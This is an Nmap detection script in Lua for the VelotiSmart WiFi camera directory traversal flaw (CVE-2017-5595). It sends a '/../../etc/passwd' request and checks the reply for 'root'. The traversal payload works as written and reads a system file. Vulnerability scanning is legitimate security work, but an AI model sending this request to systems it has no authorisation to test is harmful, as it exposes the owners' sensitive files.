local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"


author = "seaung"


license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln_detect", "velotismart_directory_traversal"}


description = [[
CVE:CVE-2017-5595
Desc: VelotiSmart WiFi camera存在目录遍历漏洞，未授权用户可以通过目录
遍历来查看系统敏感信息，如/etc/passwd
]]

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")


action = function(host, port)
	local output = stdnse.output_table()
	local path = "/../../etc/passwd"
	local check_root = "root"


	local r = http.get(host, port, path)

	if r.status == 200 then
		if string.find(r.body, check_root) ~= nil then
			output = "Found Vulnerable"
		else
			output = "Not Vulnerable"
		end
	else
		output = "Not Vulnerable"
	end
	return output
end
